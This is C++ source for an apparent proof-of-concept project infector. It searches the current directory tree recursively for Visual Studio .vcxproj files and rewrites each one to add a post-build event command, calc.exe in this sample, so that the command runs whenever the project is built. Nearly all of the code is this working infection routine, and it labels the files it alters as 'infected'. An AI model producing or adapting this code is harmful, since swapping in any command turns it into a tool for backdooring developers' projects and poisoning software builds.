#include <iostream>
#include <fstream>
#include <string>
#include <Shlwapi.h> 

using namespace std;

int infecter(std::wstring filename)
{
    string searchString = "PropertyGroup";
    string insertString = "  <ItemDefinitionGroup>\n    <PostBuildEvent>\n      <Command>calc.exe</Command>\n    </PostBuildEvent>\n  </ItemDefinitionGroup>";

    ifstream inputFile(filename);
    if (!inputFile.is_open()) {
        return 1;
    }

    string line;
    string lastPropertyGroupLine;
    bool foundPropertyGroup = false;

    while (getline(inputFile, line)) {
        if (line.find(searchString) != string::npos) {
            foundPropertyGroup = true;
            lastPropertyGroupLine = line;
        }
    }

    inputFile.close();

    if (!foundPropertyGroup) {
        return 1;
    }


    int lastPropertyGroupLineNum = -1;
    int lineNum = 0;
    inputFile.open(filename);
    while (getline(inputFile, line)) {
        if (line == lastPropertyGroupLine) {
            lastPropertyGroupLineNum = lineNum;
        }
        lineNum++;
    }
    inputFile.close();

    if (lastPropertyGroupLineNum == -1) {
        return 1;
    }

    int insertLineNum = lastPropertyGroupLineNum + 1;
    ifstream inputFile2(filename);
    ofstream outputFile("temp.xml");
    lineNum = 0;
    while (getline(inputFile2, line)) {
        outputFile << line << endl;
        if (lineNum == insertLineNum) {
            outputFile << insertString << endl;
        }
        lineNum++;
    }
    inputFile2.close();
    outputFile.close();
    std::string str = std::string(filename.begin(), filename.end());
    remove(str.c_str());
    rename("temp.xml", str.c_str());
    return 0;
}

string WStringToString(const wstring& wstr)
{
    string str;
    size_t size;
    str.resize(wstr.length());
    wcstombs_s(&size, &str[0], str.size() + 1, wstr.c_str(), wstr.size());
    return str;
}

void searchForVcxproj(const std::wstring& dirPath)
{
    WIN32_FIND_DATAW ffd;
    std::wstring searchPath = dirPath + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);
    std::wstring subDirPath;
    if (hFind == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"Failed to open directory: " << dirPath << std::endl;
        return;
    }

    do
    {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (wcscmp(ffd.cFileName, L".") != 0 && wcscmp(ffd.cFileName, L"..") != 0)
            {
                subDirPath = dirPath + L"\\" + ffd.cFileName;
                searchForVcxproj(subDirPath);
            }
        }
        std::wstring suffix(L".vcxproj");
        std::wstring fileName(ffd.cFileName);

        if (fileName.size() >= suffix.size() && fileName.substr(fileName.size() - suffix.size()) == suffix)
        {
            subDirPath = dirPath + L"\\" + ffd.cFileName;

            std::wcout << L"infected .vcxproj file: " << subDirPath << std::endl;
            infecter(subDirPath);
        }
    } while (FindNextFileW(hFind, &ffd) != 0); 

    FindClose(hFind);
}

int main() {
    TCHAR currentDir[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, currentDir);
    searchForVcxproj(currentDir);
    Sleep(5000);
    return 0;
}
